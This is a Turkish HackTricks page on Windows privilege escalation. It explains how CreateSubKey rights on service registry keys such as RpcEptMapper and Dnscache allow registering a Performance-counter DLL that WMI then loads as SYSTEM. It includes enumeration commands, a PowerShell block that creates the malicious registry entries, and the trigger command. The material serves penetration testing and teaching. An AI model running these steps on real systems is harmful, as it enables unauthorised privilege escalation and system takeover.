# Service Registry Üzerinde AppendData/AddSubdirectory İzni

{{#include ../../banners/hacktricks-training.md}}

**Orijinal gönderi** [**https://itm4n.github.io/windows-registry-rpceptmapper-eop/**](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)

## Özet

Eğer bir service registry key üzerinde yalnızca **`Create Subkey`** / **`AppendData/AddSubdirectory`** izniniz varsa, bu yine de iyi bir privesc izidir. Genellikle **`ImagePath`**, **`ServiceDll`** ya da diğer mevcut değerlerin üzerine doğrudan yazamazsınız, ancak yine de şunların altında bir **`Performance`** child key oluşturabilirsiniz:

- **`HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper`**
- **`HKLM\SYSTEM\CurrentControlSet\Services\Dnscache`**
- Token’ınızın **`KEY_CREATE_SUB_KEY`** hakkına sahip olduğu diğer herhangi bir **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`** key’i

Buradaki numara, Windows’un hâlâ eski **PerfLib V1** registration modelini desteklemesidir. Eğer bir service’in **`Performance`** alt anahtarı varsa, bir performance counter consumer veri istediğinde Windows buradan bir DLL yükleyebilir.

Microsoft documentation’a göre minimum registration şudur:
```text
HKLM\SYSTEM\CurrentControlSet\Services\<service>\Performance
Library = C:\Path\payload.dll
Open    = OpenPerfData
Collect = CollectPerfData
Close   = ClosePerfData
```
Yani saldırı açısından çıkarım şu: **yalnızca `SetValue` yerine `CreateSubKey` aldıysan, bir service registry bulgusunu hemen göz ardı etme**.

## Bu neden code execution için yeterli

`Performance` alt anahtarı bu servislerde varsayılan olarak genelde **mevcut olmaz**, bu yüzden ihtiyacın olan primitive **`KEY_CREATE_SUB_KEY`** olur. Anahtar oluşturulup `Library`/`Open`/`Collect`/`Close` değerlerini içerdiğinde, herhangi bir **performance counter consumer** DLL yüklemesini tetikleyebilir.

Birkaç önemli detay:

- **`Library`** değeri bir **tam DLL path** gösterebilir.
- DLL, **`OpenPerfData`**, **`CollectPerfData`** ve **`ClosePerfData`** export etmeli ve `ERROR_SUCCESS` döndürmelidir.
- Code, **consumer'ın context'inde** çalışır, **zorunlu olarak zafiyetli service process'in içinde değil**.
- Klasik **`RpcEptMapper`** / **`Dnscache`** durumunda, bir **WMI performance query** **`wmiprvse.exe`**'nin DLL'i **`NT AUTHORITY\SYSTEM`** olarak yüklemesine neden olabilir.

Bu yüzden triage sırasında bu primitive kolayca gözden kaçar: parent service key "tam yazılabilir" değildir, ama yine de weaponize edilebilir.

## Hızlı enumeration

**AccessChk** ile manuel kontrol:
```bash
accesschk.exe -k -w hklm\system\currentcontrolset\services\rpceptmapper
accesschk.exe -k -w hklm\system\currentcontrolset\services\dnscache
```
Service anahtarlarında **`CreateSubKey`** iznine sahip düşük ayrıcalıklı principal’ları aramak için PowerShell örneği:
```powershell
Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\Services | ForEach-Object {
$weak = (Get-Acl $_.PSPath).Access | Where-Object {
$_.AccessControlType -eq 'Allow' -and
($_.RegistryRights -band [System.Security.AccessControl.RegistryRights]::CreateSubKey) -eq [System.Security.AccessControl.RegistryRights]::CreateSubKey -and
$_.IdentityReference -match 'Users|Authenticated Users|INTERACTIVE|Network Configuration Operators'
}
if ($weak) {
[pscustomobject]@{Service=$_.PSChildName; Principals=($weak.IdentityReference -join ', '); Rights=($weak.RegistryRights -join '; ')}
}
}
```
Faydalı araçlar:

- **PrivescCheck**: `Get-ModifiableRegistryPath`, bu tür bir sorunu tespit etmek için özel olarak oluşturuldu.
- **SharpUp**: `SharpUp.exe audit ModifiableServiceRegistryKeys`
- **Perfusion**: DLL drop, `Performance` kaydı, WMI trigger, token duplication ve cleanup işlemlerini legacy vulnerable hedeflerde otomatikleştirir (örnek: `Perfusion.exe -c cmd -i -k Dnscache`).

## Abuse flow

`Performance` alt anahtarını oluşturun ve gerekli değerleri doldurun:
```powershell
$svc = 'RpcEptMapper' # or Dnscache / NetBT / another vulnerable service
$k = "HKLM:\SYSTEM\CurrentControlSet\Services\$svc\Performance"
New-Item $k -Force | Out-Null
New-ItemProperty $k -Name Library -Value "$pwd\payload.dll" -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Open -Value 'OpenPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Collect -Value 'CollectPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Close -Value 'ClosePerfData' -PropertyType String -Force | Out-Null
```
Ardından bir **privileged** performance consumer tetikleyin. Klasik bir örnek, `Win32_Perf*` sınıfları üzerinde yapılan bir WMI sorgusudur:
```powershell
powershell.exe -NoProfile -Command "Get-WmiObject -List | Where-Object { $_.Name -like 'Win32_Perf*' } | Out-Null"
```
Operasyon notları:

- **`perfmon.exe`** başlatmak, sayaç kaydının doğru olduğunu doğrulamak için faydalıdır, ancak bu genellikle DLL’i yalnızca **kendi kullanıcı bağlamınızda** yükler.
- Gerçek bir LPE için, **WMI** gibi **ayrıcalıklı** bir consumer tetikleyin.
- Kendi exploit’inizi yazıyorsanız, DLL içinden doğrudan `cmd.exe` başlatmak genellikle size **session 0** içinde bir shell bırakır. `Perfusion`, ayrıcalıklı token’ı saldırganın session’ında askıya alınmış olarak oluşturulan bir prosese kopyalayarak bunu çözer.
- DLL architecture’ını hedef consumer ile eşleştirin (**x64 sistemlerde x64**).

## Sürüm notları / son gelişmeler

Tarihsel olarak, yerleşik zayıf key’ler şunlardı:

- **Windows 7 / Windows Server 2008 R2**: `RpcEptMapper` ve `Dnscache`
- **Windows 8 / Windows Server 2012**: `RpcEptMapper`

`Perfusion`, **Nisan 2021** güncellemelerinin güncellenmiş **Windows 8 / Windows Server 2012** üzerinde kolay exploitation yolunu kaldırdığını, buna karşılık **Windows 7 / Windows Server 2008 R2**’nin **`Dnscache`** üzerinden exploitable kalmaya devam ettiğini not eder.

Bu primitive yalnızca tarihsel değildir. **Ocak 2025**’te Microsoft, **`Network Configuration Operators`** üyelerinin **`Dnscache`** ve **`NetBT`** altında subkey oluşturabildiği ilgili bir AD DS issue’yu patch etti ve aynı **Performance-counter DLL registration** fikri desteklenen sistemlerde **SYSTEM** elde etmek için yeniden kullanılabildi.

Dolayısıyla modern ders geneldir: düşük ayrıcalıklı bir principal’ın **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`** üzerinde **`CreateSubKey`** yetkisi olduğunda, bulguyu göz ardı etmeden önce bir **`Performance`** child key’in yeterli olup olmadığını kontrol edin.

## References

- [Microsoft Learn - Creating the Application's Performance Key](https://learn.microsoft.com/en-us/windows/win32/perfctrs/creating-the-applications-performance-key)
- [BirkeP - Active Directory Domain Services Elevation of Privilege Vulnerability (CVE-2025-21293)](https://birkep.github.io/posts/Windows-LPE/)
{{#include ../../banners/hacktricks-training.md}}
